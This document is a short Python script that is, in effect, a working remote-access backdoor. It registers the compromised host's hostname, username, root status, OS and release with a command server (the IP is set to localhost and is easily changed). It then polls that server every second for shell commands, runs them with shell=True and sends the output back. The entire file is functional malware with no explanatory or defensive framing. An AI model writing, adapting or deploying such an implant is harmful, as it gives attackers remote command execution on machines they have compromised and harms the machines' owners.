import os
import requests
import socket
import subprocess
import platform
import time
import getpass

SERVERIP = "127.0.0.1"
SERVERPORT = "80"

HOSTNAME = socket.gethostname()
if os.geteuid() == 0:
    USER = "root"
else:
    USER = getpass.getuser()
OS = platform.system()
VERSION = platform.release()
ID = f"{USER}@{HOSTNAME}"
SERVER = f"http://{SERVERIP}:{SERVERPORT}"

# Register
requests.post(f"{SERVER}/register", data={
    "id": ID,
    "hostname": HOSTNAME,
    "username": USER,
    "os": OS,
    "version": VERSION
})

# Command loop
while True:
    try:
        response = requests.get(f"{SERVER}/{ID}.html")
        CMD = response.text.strip()
        if CMD:
            try:
                result = subprocess.check_output(CMD, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                result = e.output
            requests.post(f"{SERVER}/{ID}/result", data={"cmd": CMD, "result": result})
    except Exception as e:
        pass  # You can log this if needed
    time.sleep(1)
